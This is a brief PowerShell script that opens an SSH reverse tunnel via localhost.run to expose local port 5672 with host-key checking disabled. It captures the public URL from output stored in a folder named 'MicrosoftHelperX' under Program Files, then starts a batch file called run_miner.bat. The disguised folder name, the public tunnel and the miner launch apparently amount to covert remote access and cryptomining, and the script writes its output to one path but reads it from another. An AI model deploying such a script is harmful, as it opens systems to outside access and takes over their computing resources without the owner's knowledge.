# Run the SSH command and redirect output to a temporary file in the background
Start-Process -FilePath "ssh" -ArgumentList "-R 80:localhost:5672 localhost.run -o StrictHostKeyChecking=no" -RedirectStandardOutput "C:\Program Files\MicrosoftHelperX\temp.txt" -PassThru 

#Start-Process -FilePath "C:\Program Files\nodejs\lt" -ArgumentList "--port 5672" -RedirectStandardOutput "temp.txt" -PassThru -WindowStyle Hidden

# Wait for a short period to ensure the file is written
Start-Sleep -Seconds 5

# Find the line containing the URL in the temporary file
$url = Get-Content "./temp.txt" | Select-String -Pattern "https:\/\/[a-zA-Z0-9.-]+\.lhr\.life" | ForEach-Object { $_.Matches.Value }

# Print the captured URL 	
Write-Output $url

# Clean up temporary file
# Remove-Item "temp.txt"

Start-Process -FilePath "E:\dem\dara\run_miner.bat"

